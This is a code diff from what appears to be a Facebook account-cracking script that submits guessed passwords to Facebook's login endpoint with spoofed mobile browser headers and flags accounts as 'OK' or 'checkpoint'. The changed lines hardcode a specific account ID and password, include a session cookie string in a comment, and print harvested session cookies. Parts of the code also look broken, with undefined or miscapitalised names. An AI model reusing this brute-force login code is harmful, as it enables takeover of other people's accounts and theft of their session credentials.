@@ -139,7 +139,7 @@ def _M1_(ids,pasx):
                         "li": re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
                         "try_number": 0,
                         "unrecognized_tries": 0,
-                        "email": ids,
+                        "email": '100080650416607',
                         "prefill_contact_point": "",
                         "prefill_source": "",
                         "prefill_type": "",
@@ -149,7 +149,7 @@ def _M1_(ids,pasx):
                         "had_password_prefilled": "false",
                         "is_smart_lock": "false",
                         "bi_xrwh": 0,
-                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
+                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], '620639'),
                         "bi_wvdp": "",
                         "fb_dtsg": "",
                         "jazoest": re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
@@ -161,31 +161,32 @@ def _M1_(ids,pasx):
                         "a": "",
                         "user": 0,}
                         tedy = {
-                        'user-agent': '[FBAN/FB4A;FBAV/392.0.0.28.53;FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/3723264;FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/2312DRAABG;FBSV/8;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1',
-                        'Accept-Encoding': 'gzip, deflate',
-                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'Connection': 'keep-alive',
-                        'Host': 'x.prod.facebook.com',
-                        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                        'cache-control': 'max-age=0',
-                        'dpr': '3',
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-fetch-dest': 'document',
-                        'sec-fetch-mode': 'navigate',
-                        'sec-fetch-site': 'cross-site',
-                        'sec-fetch-user': '?1',
-                        'upgrade-insecure-requests': '1',
-                        'viewport-width': '980',}
+                        'authority': 'm.alpha.facebook.com',
+                        'accept': '*/*',
+                        'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                        # 'cookie': 'dpr=2.418783187866211; ps_l=1; ps_n=1; sb=K7peZw-stm96bp9jczd4iRSX; datr=K7peZ8R7XJfFPDteD4gLNXP4; m_pixel_ratio=2.200000047683716; wd=491x968; fr=1GXBeS4MZ2kWto2Oz.AWUDKf1CUfJ01SOxkzkKhFd-ZKs.BnXrot..AAA.0.0.BnaVxe.AWUqH7Rmiv4',
+                        'origin': 'https://m.alpha.facebook.com',
+                        'referer': 'https://m.alpha.facebook.com/',
+                        'sec-ch-prefers-color-scheme': 'dark',
+                        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+                        'sec-ch-ua-mobile': '?1',
+                        'sec-ch-ua-model': '"23076PC4BI"',
+                        'sec-ch-ua-platform': '"Android"',
+                        'sec-ch-ua-platform-version': '"15.0.0"',
+                        'sec-fetch-dest': 'empty',
+                        'sec-fetch-mode': 'cors',
+                        'sec-fetch-site': 'same-origin',
+                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
                         lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                                uid = re.findall('c_user=(.*);xs', coki)[0]
-                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
-                                #####print(f"\r\033[38;5;46mCOOKIES=[🍪]: {coki}\33[1;36m")
+                                cok = Session.cookies.get_dict()
+                                cid = cok["c_user"]
+                                print(f"\r\033[38;5;46mCOOKIES=[🍪]: {coki}\33[1;36m")
                                ######৳ print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
-                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
-                                ok.append(uid)
                                 break
                         elif 'checkpoint' in BLACK:
                                 print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
